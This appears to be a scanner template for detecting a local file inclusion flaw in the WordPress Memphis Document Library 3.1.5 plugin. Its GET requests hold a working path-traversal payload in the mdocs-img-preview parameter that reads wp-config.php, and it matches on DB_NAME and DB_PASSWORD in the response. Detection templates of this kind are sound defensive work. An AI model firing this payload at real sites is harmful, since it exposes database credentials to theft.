id: wp-memphis-documents-library-lfi
brief:
    title: WordPress Memphis Document Library 3.1.5 - Local File Inclusion
    by: 0x_Akoko
    level: high
    about: WordPress Memphis Document Library 3.1.5 is vulnerable to local file inclusion.
    label:
        - wpscan
        - wordpress
        - wp-plugin
        - lfi
        - edb
        - vuln
    score: CVSS:7.5
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/mdocs-posts/?mdocs-img-preview=../../../wp-config.php'
        - '{{BaseURL}}/?mdocs-img-preview=../../../wp-config.php'
      signs:
        - "on": word
          has:
            - DB_NAME
            - DB_PASSWORD
          in: body
          need: all
        - "on": status
          status:
            - 200
